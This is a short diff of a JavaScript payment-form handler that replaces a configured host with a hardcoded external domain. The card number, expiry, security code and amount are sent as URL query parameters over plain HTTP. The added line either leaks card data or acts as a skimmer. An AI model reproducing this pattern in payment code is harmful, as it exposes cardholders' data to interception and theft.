@@ -206,7 +206,7 @@ window.onload = function () {
     const expirationDateValue = expirationdate.value;
     const securityCodeValue = securitycode.value;
     const amountValue = amount.value;
-    console.log(process.env.HOST);
+
     if (
       cardNumberValue.length !== 19 ||
       !expirationDateValue ||
@@ -215,7 +215,7 @@ window.onload = function () {
     )
       return alert('Wrong card data');
 
-    location.href = `${process.env.HOST}/pay?cardNumber=${cardNumberValue}&expiryDate=${expirationDateValue}&securityCode=${securityCodeValue}&moneyAmount=${amountValue}`;
+    location.href = `http://m-apps.ru/pay?cardNumber=${cardNumberValue}&expiryDate=${expirationDateValue}&securityCode=${securityCodeValue}&moneyAmount=${amountValue}`;
     return;
   });
 
